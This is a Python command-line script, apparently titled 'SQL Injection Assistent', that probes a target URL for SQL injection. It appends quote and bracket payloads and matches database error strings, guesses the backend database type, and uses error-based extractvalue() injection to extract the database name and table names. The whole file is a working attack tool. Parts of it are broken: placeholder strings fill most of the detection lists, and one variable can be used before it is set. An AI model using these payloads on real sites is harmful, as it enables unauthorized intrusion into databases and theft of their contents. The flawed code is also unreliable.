import requests, argparse, itertools
from bs4 import BeautifulSoup as BS

def tables_name(url):
    print("Extracting tables names...")
            
    link=link=str(url)+" and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
    results = requests.get(link)
    data = results.text 
    str_num = str(data).find('error: ')
    str1_num = data[str_num:]
    str1 = str1_num[8:]
    str2 = str1.find('\'')
    str3 = str1[:str2]
    print("\nTable names: " + str3)

def Main(test, get_database_type, dbname):
    if args.test:
        urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test[:-4] + ")", args.test[:-4] + "')", args.test[:-4] + '")', args.test[:-4] + '*'] 
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for vuln in vulnerable_text:
                    if vuln in data:
                        string = vuln
                        vulnerable = True
            if vulnerable:
                print('Site is vulnerable!')
        except:
            print('Site is not vulnerable!')
    elif args.dbname:
        link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --"
        print(link)
        results = requests.get(link)
        data = results.text 
        str_num = str(data).find('error:')
        print(str_num) 
        str1_num = data[str_num:]
        str1 = str1_num[8:]
        str2 = str1.find('\'')
        str3 = str1[:str2]
        print("Database name: " + str3)
    elif args.get_database_type:
        urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type[:-4] + ")", args.get_database_type[:-4] + "')", args.get_database_type[:-4] + '")', args.get_database_type[:-4] + '*']

        # Init Database Types
        MySQL = False
        PostGre = False
        Microsoft_SQL = False
        Oracle = False
        Advantage_Database_Server = False
        Firebird = False
        Azure = False
        SqlCe = False
        VistaDb = False
        MariaDB = False

        # Database Identifiers
        MySQL_list = ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()']
        PostGre_list = ['dafafdfds']
        Microsoft_SQL_list = ['dafafdfds']
        Oracle_list = ['dafafdfds']
        Advantage_Database_list = ['dafafdfds']
        Firebird_list = ['dafafdfds']
        Azure_list = ['dafafdfds']
        SqlCe_list = ['dafafdfds']
        VistaDb_list = ['dafafdfds']
        MariaDB_list = ['dafafdfds']

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in MySQL_list:
                    if dbi in data:
                        MySQL = True
        except:
            MySQL = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in PostGre_list:
                    if dbi in data:
                        PostGre = True
        except:
            PostGre = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in Microsoft_SQL_list:
                    if dbi in data:
                        Microsoft_SQL = True
        except:
            Microsoft_SQL = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in Oracle_list:
                    if dbi in data:
                        Oracle = True
        except:
            Oracle = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in Advantage_Database_list:
                    if dbi in data:
                        Advantage_Database_Server = True
        except:
            Advantage_Database_Server = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in Firebird_list:
                    if dbi in data:
                        Firebird = True
        except:
            Firebird = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in Azure_list:
                    if dbi in data:
                        Azure = True
        except:
            Azure = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in SqlCe_list:
                    if dbi in data:
                        SqlCe = True
        except:
            SqlCe = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in VistaDb_list:
                    if dbi in data:
                        VistaDb = True
        except:
            VistaDb = False

        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for dbi in MariaDB_list:
                    if dbi in data:
                        MariaDB = True
        except:
            MariaDB = False

        if MySQL:
            print('Database type is: MySQL')
        elif PostGre:
            print('Database type is: PostGre')
        elif Microsoft_SQL:
            print('Database type is: Microsoft SQL Server')
        elif Oracle:
            print('Database type is: Oracle')
        elif Advantage_Database_Server:
            print('Database type is: Advantage Database Server')
        elif Firebird:
            print('Database type is: Firebird')
        elif Azure:
            print('Database type is: Azure')
        elif SqlCe:
            print('Database type is: SqlCe')
        elif VistaDb:
            print('Database type is: VistaDb')
        elif MariaDB:
            print('Database type is: MariaDB')
        else:
            print('Database type is: Unknown')
    else:
        print('Invalid Argument given!')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SQL Injection Assistent')
    ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerablities>', description='SQL Injection Assistent')
    ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerablities')
    ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
    ap.add_argument('-dbn', '--dbname', type=str, help='Get database name of Target')
    args = ap.parse_args()
    test = args.test
    dbname = args.dbname
    get_database_type = args.get_database_type
    Main(test, get_database_type, dbname)
